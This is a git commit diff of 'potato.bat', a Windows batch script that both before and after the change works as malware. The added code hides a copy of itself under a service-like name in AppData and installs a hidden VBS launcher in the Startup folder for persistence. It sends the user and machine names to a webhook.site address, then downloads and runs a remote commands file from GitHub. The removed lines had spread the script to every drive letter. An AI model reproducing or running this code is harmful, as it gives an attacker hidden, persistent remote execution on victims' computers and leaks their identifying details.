1f5f436c89b7a646d2e57a81d666eefb7d3e72c5
romort2 <191442434+romort2@users.noreply.github.com>
2026-08-08 12:42:27 +0530

    2

--- potato.bat
+++ potato.bat
@@ -1,27 +1,48 @@
 @echo off
-echo %~nx0
-:: Copy to startup
-powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~n0.lnk');$s.TargetPath='%~f0';$s.Save()"
-mkdir system2
-attrib +h system2
-cd system2
-:: get commands
-curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/c > commands.bat
+:: Define paths
+set startup=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
+set target=%AppData%\WinSvc
 
+:: Check if relocation has already happened
+if exist "%target%\maintenance.bat" (
+    :: Already relocated, skip straight to main contents
+    goto :main
+)
 
+:: First-time relocation
+mkdir "%target%" >nul 2>&1
 
-call commands.bat
-attrib +h %~nx0
+:: Copy this batch file into the target folder
+copy "%~f0" "%target%\maintenance.bat" /Y
 
-if %~d0=="C:" (
+:: Hide the folder (optional)
+attrib +h "%target%" >nul
+
+:: Create the VBS launcher in Startup
+(
+echo Set WshShell = CreateObject("WScript.Shell")
+echo WshShell.Run """%target%\maintenance.bat""", 0, True
+echo Set WshShell = Nothing
+) > "%startup%\winsvc.vbs"
+
+:: Delete self from Startup (so only the VBS remains)
+del "%~f0" >nul
+attrib +h +s "%startup%\winsvc.vbs"
+:: Terminate after starting the relocated copy
+cscript //nologo "%startup%\winsvc.vbs"
+exit /b
+
+:main
+attrib +h "%target%\maintenance.bat"
+
+if "%~d0"=="C:" (
 :: get auto updates
-curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/potato.bat > potato.bat
-for %%i in (D E F G H I J K L M N O P Q R S T U V W X Y Z) DO @if exist %%i: xcopy /s /h /y %0 %%i:
+curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/potato.bat > %target%\maintenance.bat
 
+if /I not "%~dp0"=="C:\" (
+    copy "%~f0" "%UserProfile%\Documents\"
 )
-
-if not %~dp0 =="C:\" (
-copy %0 %UserProfile%\Documents
-
-)
-call commands.bat
+curl --ssl-no-revoke "https://webhook.site/a1a38627-23f7-443f-8434-ae6efabeae7f?machine=%USERNAME%&name=%COMPUTERNAME%"
+curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/c > %target%\commands.bat
+attrib +h "%target%\commands.bat"
+call "%target%\commands.bat"
